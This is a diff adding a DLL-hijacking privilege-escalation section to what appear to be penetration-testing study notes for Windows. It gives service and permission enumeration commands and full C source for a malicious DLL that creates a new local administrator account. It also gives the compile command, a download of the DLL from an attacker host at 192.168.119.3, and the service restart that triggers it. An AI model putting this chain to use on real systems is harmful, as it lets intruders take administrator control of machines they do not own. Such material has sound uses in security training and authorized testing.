@@ -510,6 +510,66 @@ Restart the service `> net stop mysql` or restart the machine `> shutdown /r /t 
 6. `> Get-ModifiableServiceFile`
 7. `> Install-ServiceBinary -Name 'mysql'`
 
+### Service DLL Hijacking
+
+If a We don't have the permissions to replace or edit a binary, hack the DLL. **Overwrite a DLL** the a binary uses. **OR**, a second method is to **hijack** the DLL search order.
+
+```
+DLL Search Order:
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+```
+
+Here we will place a Malicious DLL in the search order:
+
+Get service info: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+
+Check binary permissions. Note: if bad perms (no F/M), do the DLL thing: `icacls .\Documents\BetaServ.exe`
+
+Copy the binary to a local machine and open with process monitor and observe the service during start.
+
+Are there missing DLLs listed ie `NAME NOT FOUND`? 
+
+Are DLLs loaded from writable directories? 
+
+Create a malicous DLL: 
+
+```
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave2 password123! /add");
+  	    i = system ("net localgroup administrators dave2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+Complie: `$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`
+
+Download from attacker to victim: `> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll`
+
+Restart service to exploit DLL: `> Restart-Service BetaService`
 
 
 # Anti-virus Evasion
